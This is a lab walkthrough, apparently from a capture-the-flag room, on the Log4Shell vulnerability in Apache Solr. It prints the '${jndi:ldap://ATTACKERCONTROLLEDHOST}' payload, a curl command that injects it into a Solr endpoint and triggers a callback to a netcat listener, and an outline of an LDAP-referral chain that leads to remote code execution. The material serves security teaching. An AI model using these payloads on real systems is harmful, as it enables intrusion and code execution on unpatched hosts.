## Apache Log4j remote code execution 

On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package `log4j`. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this `log4j` version. This attack has been dubbed "Log4Shell"

Today, `log4j` version `2.16.0` is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present). [https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0]

However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using `log4j`, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of [https://en.wikipedia.org/wiki/Shellshock_(software_bug)]  by the nature of its enormous attack surface. We will see this vulnerability for years to come.

This room will showcase how you can test for, exploit, and mitigate this vulnerability within Log4j. While there are a number of other articles, blogs, resources and learning material surrounding CVE-2021-44228, I (the author of this exercise) am particularly partial to these:

## reconnaissance 

The target virtual machine includes software that utilizes this vulnerable `log4j` package, offering you a playground to explore the vulnerability.

```
nmap -v 10.10.210.147

PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
MAC Address: 02:BD:61:D4:B0:99 (Unknown)

nmap -v -p- 10.10.210.147

PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
8983/tcp open  unknown

10.10.210.147:8983

http://10.10.210.147:8983/solr/#/

Apache Solr

```


## discovery 

This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable `log4j` package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181.

Explore the web interface accessible at `http://10.10.210.147:8983`
and click around to get a feel for the application. For more detail on Apache Solr, please refer to their official website. [https://solr.apache.org/](https://solr.apache.org/)

This instance of Apache Solr is provisioned with no data whatsoever. It is a flat, vanilla, and absolutely minimum installation -- yet at its core it is still vulnerable to this CVE-2021-44228.

```
INFO (qtp1083962448-20)[] ... path=/admin/cores params={}

Take a close look at the first page visible when navigating to [http://10.10.210.147:8983]. You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the `-Dsolr.log.dir` argument set to, displayed on the front page?

/var/solr/logs


Download the attached files (accessible in the top-right of this task) see some _example_ log files within Solr. Explore each file, if just to get a feel for what is displayed in what log. 

One file has a significant number of `INFO` entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)

solr.log

What "path" or URL endpoint is indicated in these repeated entries?

/admin/cores


Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)


params

```


## proof of concept

Note that the URL endpoint that you have just uncovered needs to be prefaced with the `solr/` prefix when viewing it from the web interface. This means that you should visit:

`http://10.10.210.147:8983/solr/admin/cores`

You also noticed that `params` seems to be included in the log file. At this point, you may already be beginning to see the attack vector.

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact _executed_ just as it is entered into log files.

```
examples of this syntax are:

${sys:os.name}
${sys:user.name}
${log4j:configParentLocation}
${ENV:PATH}
${ENV:HOSTNAME}
${java:version}

You may already know the general payload to abuse this log4j vulnerability.

${jndi:ldap://ATTACKERCONTROLLEDHOST}
```

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 

Notice the `ldap://` schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For the sake of brevity, we will not need to cover all the ins-and-outs and details of LDAP here, but know that this is something we will need to work with as we refine our attack.

For now, know that the target will in fact make a connection to an external location. This is indicated by the `ATTACKERCONTROLLEDHOST` placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.

The next question is, where could we enter this syntax?
Anywhere that has data logged by the application.

This is the crux of this vulnerability. Unfortunately, it is very hard to determine where the attack surface is for different applications, and ergo, _what_ applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.

Think back to the previous task. You already discovered that you could supply `params` to the `/solr/admin/cores` URL, and now that you have a better understanding of how log4j works, you should understand that _this_ is where you supply your inject syntax. You can simply supply HTTP GET variables or parameters which will then processed and parsed by log4j. All it takes is this single line of text -- and that makes this vulnerability extremely easy to exploit.

Other locations you might supply this JNDI syntax:

- Input boxes, user and password login forms, data entry points within applications
- HTTP headers such as `User-Agent`, `X-Forwarded-For`, or other customizable headers
- Any place for user-supplied data

[https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf] 

```
ip addr show
	inet 10.10.107.30
nc -vnlp 9999

curl 'http://10.10.115.88:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.107.30:9999\}'

`Connection received from 10.10.115.88`


```


## exploitation 

At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your `netcat` listener. However, it made an LDAP request... so all your `netcat` listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler.

We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:

```
1. ${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
2. LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
3. The victim retrieves and executes the code present in http://attackerserver/resource

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):

- python3 -m http.server
- php -S 0.0.0.0:8000
- (or any other `busybox httpd` or formal web service you might like)
```

If you get stuck on any of the following steps, we have a video showcasing (using the AttackBox) each step to gain remote code execution: [https://youtu.be/OJRqyCHheRE]
